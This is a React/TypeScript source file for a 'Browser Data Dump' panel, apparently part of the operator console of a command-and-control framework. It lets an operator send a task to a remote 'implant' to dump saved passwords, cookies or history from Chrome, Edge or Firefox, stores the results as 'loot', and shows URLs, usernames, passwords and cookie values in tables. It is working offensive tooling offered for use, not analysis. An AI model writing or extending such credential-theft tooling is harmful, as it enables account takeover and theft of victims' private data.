import { useState } from 'react';
import { taskClient } from '../../api';

interface Props {
  sessionId: string;
}

function hexToUint8Array(hex: string): Uint8Array<ArrayBuffer> {
  const buffer = new ArrayBuffer(hex.length / 2);
  const bytes = new Uint8Array(buffer);
  for (let i = 0; i < hex.length; i += 2) {
    bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
  }
  return bytes;
}

type BrowserKey = 'chrome' | 'edge' | 'firefox';
type DumpType = 'dump_passwords' | 'dump_cookies' | 'dump_history' | 'dump_all';

interface DumpTypeOption {
  value: DumpType;
  label: string;
}

const BROWSERS: { key: BrowserKey; label: string }[] = [
  { key: 'chrome',  label: 'Chrome'  },
  { key: 'edge',    label: 'Edge'    },
  { key: 'firefox', label: 'Firefox' },
];

const DUMP_TYPES: DumpTypeOption[] = [
  { value: 'dump_passwords', label: 'Passwords' },
  { value: 'dump_cookies',   label: 'Cookies'   },
  { value: 'dump_history',   label: 'History'   },
  { value: 'dump_all',       label: 'All'        },
];

interface BrowserResult {
  browser: string;
  dumpType: string;
  rows: string[][];
}

export function BrowserDumpPanel({ sessionId }: Props) {
  const [selectedBrowsers, setSelectedBrowsers] = useState<Set<BrowserKey>>(new Set(['chrome', 'edge', 'firefox']));
  const [allBrowsers, setAllBrowsers] = useState(true);
  const [dumpType, setDumpType] = useState<DumpType>('dump_passwords');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [taskId, setTaskId] = useState<string | null>(null);
  const [result, setResult] = useState<BrowserResult | null>(null);

  const toggleBrowser = (key: BrowserKey) => {
    if (allBrowsers) {
      setAllBrowsers(false);
      setSelectedBrowsers(new Set([key]));
      return;
    }
    const next = new Set(selectedBrowsers);
    if (next.has(key)) {
      next.delete(key);
    } else {
      next.add(key);
    }
    setSelectedBrowsers(next);
  };

  const toggleAll = () => {
    setAllBrowsers(!allBrowsers);
    if (!allBrowsers) {
      setSelectedBrowsers(new Set(['chrome', 'edge', 'firefox']));
    }
  };

  const handleExecute = async () => {
    const browsers = allBrowsers
      ? ['chrome', 'edge', 'firefox']
      : Array.from(selectedBrowsers);

    if (browsers.length === 0) {
      setError('Select at least one browser.');
      return;
    }

    setLoading(true);
    setError(null);
    setTaskId(null);
    setResult(null);

    try {
      const encoder = new TextEncoder();
      const parts = [dumpType, ...browsers];
      const taskData = encoder.encode(parts.join('\0')) as Uint8Array<ArrayBuffer>;

      const response = await taskClient.dispatchTask({
        implantId: { value: hexToUint8Array(sessionId) },
        taskType: 'browser',
        taskData,
      });

      const id = response.taskId
        ? Array.from(response.taskId.value).map(b => b.toString(16).padStart(2, '0')).join('')
        : '';
      setTaskId(id);
    } catch (err: any) {
      setError(err.message || 'Failed to dispatch task');
    } finally {
      setLoading(false);
    }
  };

  const columnsForDumpType: Record<DumpType, string[]> = {
    dump_passwords: ['Browser', 'URL', 'Username', 'Password'],
    dump_cookies:   ['Browser', 'Host', 'Name', 'Value', 'Expires'],
    dump_history:   ['Browser', 'URL', 'Title', 'Visit Count', 'Last Visit'],
    dump_all:       ['Browser', 'Type', 'Key', 'Value'],
  };

  return (
    <div className="p-4 space-y-5">
      <h3 className="text-ctp-text font-semibold text-sm uppercase tracking-wide">Browser Data Dump</h3>

      <div className="px-3 py-2 rounded bg-ctp-surface0 border border-ctp-surface2 text-xs text-ctp-subtext0 italic">
        Dumped data will be automatically stored in loot.
      </div>

      {/* Browser selection */}
      <div className="space-y-2">
        <label className="text-xs text-ctp-subtext0 uppercase tracking-wide">Browsers</label>
        <div className="flex flex-wrap gap-2">
          <label className="flex items-center gap-2 cursor-pointer">
            <input
              type="checkbox"
              checked={allBrowsers}
              onChange={toggleAll}
              className="w-4 h-4 accent-ctp-mauve"
            />
            <span className="text-sm text-ctp-text font-medium">All</span>
          </label>
          {BROWSERS.map(({ key, label }) => (
            <label key={key} className="flex items-center gap-2 cursor-pointer">
              <input
                type="checkbox"
                checked={allBrowsers || selectedBrowsers.has(key)}
                onChange={() => toggleBrowser(key)}
                className="w-4 h-4 accent-ctp-blue"
              />
              <span className="text-sm text-ctp-text">{label}</span>
            </label>
          ))}
        </div>
      </div>

      {/* Dump type */}
      <div className="space-y-2">
        <label className="text-xs text-ctp-subtext0 uppercase tracking-wide">Dump Type</label>
        <div className="flex flex-wrap gap-2">
          {DUMP_TYPES.map(({ value, label }) => (
            <button
              key={value}
              onClick={() => setDumpType(value)}
              className={`px-3 py-1.5 rounded text-sm font-medium transition-colors border ${
                dumpType === value
                  ? 'bg-ctp-mauve text-ctp-base border-ctp-mauve'
                  : 'bg-ctp-surface0 text-ctp-text border-ctp-surface2 hover:bg-ctp-surface1'
              }`}
            >
              {label}
            </button>
          ))}
        </div>
      </div>

      <button
        onClick={handleExecute}
        disabled={loading}
        className="px-4 py-2 rounded text-sm font-medium bg-ctp-blue text-ctp-base hover:bg-ctp-blue/80 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
      >
        {loading ? 'Dispatching...' : 'Execute'}
      </button>

      {error && (
        <div className="px-3 py-2 rounded bg-ctp-red/20 text-ctp-red text-sm border border-ctp-red/30">
          {error}
        </div>
      )}

      {taskId && (
        <div className="text-xs text-ctp-subtext0">
          Task ID: <span className="font-mono text-ctp-blue">{taskId}</span>
        </div>
      )}

      {result && (
        <div className="rounded border border-ctp-surface2 overflow-auto">
          <p className="px-3 py-1.5 text-xs text-ctp-subtext0 uppercase tracking-wide bg-ctp-crust border-b border-ctp-surface2">
            Results — {result.browser} / {result.dumpType}
          </p>
          <table className="w-full text-xs">
            <thead className="bg-ctp-crust">
              <tr>
                {columnsForDumpType[dumpType].map(col => (
                  <th key={col} className="px-3 py-2 text-left text-ctp-subtext0 font-medium">
                    {col}
                  </th>
                ))}
              </tr>
            </thead>
            <tbody className="divide-y divide-ctp-surface0">
              {result.rows.map((row, i) => (
                <tr key={i} className="hover:bg-ctp-surface0/50">
                  {row.map((cell, j) => (
                    <td key={j} className="px-3 py-1.5 text-ctp-text font-mono truncate max-w-xs">
                      {cell}
                    </td>
                  ))}
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}
